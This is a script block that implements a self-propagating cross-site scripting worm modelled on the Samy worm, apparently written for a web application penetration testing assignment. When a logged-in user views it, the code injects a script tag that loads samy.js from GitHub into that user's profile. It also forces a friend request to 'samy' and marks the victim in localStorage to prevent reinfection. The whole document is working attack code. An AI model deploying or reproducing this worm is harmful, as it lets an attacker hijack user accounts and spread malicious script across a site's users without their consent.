<script>
	function updateProfile() {
		payload = "\<script" + " src=\"https://github.com/gjh0239/WAPT-Assignment-1/blob/main/samy.js\"\>" + "\<\/script\>";

		fetch("/profile/update", {
			method: "POST",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify({ "content": payload+"Samy is the hero!"})
		})
	}
	
	function addFriend() {
		fetch("/friend", {
			method: "POST",
			headers: {
				"Content-Type": "application/json",
			},
			body: JSON.stringify({ friend: "samy" })
		})
	}

	const usernameTag = document.getElementById("username");
    if (usernameTag.textContent !== "samy" && !localStorage.getItem(usernameTag.textContent)){
		const username = usernameTag.querySelector("strong").innerText.trim();
    	updateProfile();
    	addFriend();
		
		// prevent re-infection of victim
		localStorage.setItem(usernameTag.textContent, true);
	}
</script>
